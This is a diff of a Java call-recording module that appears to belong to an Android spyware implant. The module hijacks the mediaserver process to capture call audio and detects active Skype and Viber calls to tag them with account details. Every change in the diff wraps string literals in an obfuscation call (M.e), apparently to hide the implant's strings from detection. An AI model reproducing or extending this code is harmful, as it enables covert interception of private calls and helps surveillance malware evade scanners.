@@ -232,7 +232,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		cb = new CallBack();
 		cb.register(new InternalCallBack());
 
-		hijack = new Instrument("mediaserver", AudioEncoder.getAudioStorage());
+		hijack = new Instrument(M.e("mediaserver"), AudioEncoder.getAudioStorage());
 
 		if (hijack.installHijacker()) {
 			if (Cfg.DEBUG) {
@@ -926,9 +926,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		last_epoch = audioEncoder.getCallEndTime();
 
 		// Now rawPcm contains the raw data
-		String encodedFile = f + ".err";
+		String encodedFile = f + M.e(".err");
 
-		boolean remote = encodedFile.endsWith("-r.tmp.err");
+		boolean remote = encodedFile.endsWith(M.e("-r.tmp.err"));
 
 		if (!updateCallInfo(callInfo, false)) {
 			if (Cfg.DEBUG) {
@@ -1083,11 +1083,11 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		ListenerProcess lp = ListenerProcess.self();
 
-		if (lp.isRunning("com.skype.raider")) {
+		if (lp.isRunning(M.e("com.skype.raider"))) {
 			if (end) {
 				return true;
 			}
-			callInfo.processName = "com.skype.raider";
+			callInfo.processName = M.e("com.skype.raider");
 			// open DB
 			String account = ChatSkype.readAccount();
 			callInfo.account = account;
@@ -1103,9 +1103,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 
 			return ret;
-		} else if (lp.isRunning("com.viber.voip")) {
+		} else if (lp.isRunning(M.e("com.viber.voip"))) {
 			boolean ret = false;
-			callInfo.processName = "com.viber.voip";
+			callInfo.processName = M.e("com.viber.voip");
 			callInfo.delay = true;
 			callInfo.heur = true;
 			
@@ -1124,8 +1124,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 					Check.log(TAG + " (updateCallInfo) id: " + callInfo.id);
 				}
 			} else {
-				callInfo.account = "delay";
-				callInfo.peer = "delay";
+				callInfo.account = M.e("delay");
+				callInfo.peer = M.e("delay");
 				ret = true;
 			}
 
